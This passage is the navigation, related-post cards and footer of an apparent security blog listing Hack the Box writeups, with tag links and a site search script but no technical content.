href="/posts/zip-unzip-files-powershell/">How to Zip and Unzip Files Using PowerShell</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/hack-the-box/">hack the box</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/unfinished/">unfinished</a> <a class="post-tag" href="/tags/oscp/">oscp</a> <a class="post-tag" href="/tags/tj-null/">tj_null</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <script src="https://utteranc.es/client.js" repo="zweilosec/zweilosec.github.io" issue-term="title" label="comments 💬" theme="github-dark" crossorigin="anonymous" async> </script><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/playertwo/"><div class="card-body"> <span class="timeago small" > Jun 26, 2020 <i class="unloaded">2020-06-26T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - PlayerTwo Writeup</h3><div class="text-muted small"><p> HTB - PlayerTwo Overview An Insane difficulty Linux machine that tested my web skills quite a bit and also had me doing as much research on new protocols and services as three or four easy or m...</p></div></div></a></div><div class="card"> <a href="/posts/admirer/"><div class="card-body"> <span class="timeago small" > Aug 6, 2020 <i class="unloaded">2020-08-06T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Admirer Writeup</h3><div class="text-muted small"><p> HTB - Admirer Overview An easy difficulty Linux machine that has an interesting take on database manipulation to obtain a local file inclusion vulnerability. It also has an interesting new (to...</p></div></div></a></div><div class="card"> <a href="/posts/tabby/"><div class="card-body"> <span class="timeago small" > Oct 12, 2020 <i class="unloaded">2020-10-12T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Tabby Writeup</h3><div class="text-muted small"><p> HTB - Tabby Overview This machine is on TJ_Null’s list of OSCP-like machines. Have fun! Short description to include any strange things to be dealt with. TODO: Finish writeup and clean up U...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/blunder/" class="btn btn-outline-primary" prompt="Older"><p>Hack the Box - Blunder Writeup</p></a> <a href="/posts/servmon/" class="btn btn-outline-primary" prompt="Newer"><p>Hack the Box - Servmon Writeup</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/zweilosec">zweilosec</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/hack-the-box/">hack the box</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/unfinished/">unfinished</a> <a class="post-tag" href="/tags/oscp/">oscp</a> <a class="post-tag" href="/tags/tj-null/">tj_null</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://zweilosec.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
